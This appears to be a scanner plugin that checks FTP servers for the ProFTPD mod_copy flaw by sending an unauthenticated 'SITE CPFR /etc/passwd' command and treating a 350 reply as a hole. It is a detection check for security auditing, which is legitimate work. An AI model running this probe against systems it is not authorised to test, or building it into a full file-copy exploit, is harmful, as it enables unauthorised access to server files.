#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 'ArchStacker'
#_PlugName_ = ProFTPD mod_copy
#_FileName_ = ProFTPD_mod_copy.py
"""
reference:
    bugs.proftpd.org/show_bug.cgi?id=4169
    http://www.beebeeto.com/pdb/poc-2015-0088/
"""
import socket

def assign(service, arg):
    if service == "ftp":
        return True, arg

def audit(arg):
    ip,port = arg
    try:
        s = socket.socket()
        s.connect((ip,port))
        s.recv(1024)
        s.send("SITE CPFR /etc/passwd\r\n")
        data = s.recv(1024)
        if '350' in data:
            security_hole("%s:%d" % (ip,port))
        s.close()
    except:
        pass

if __name__ == '__main__':
    from dummy import *
    audit(assign('ftp', ('http://www.example.com/',21))[1])
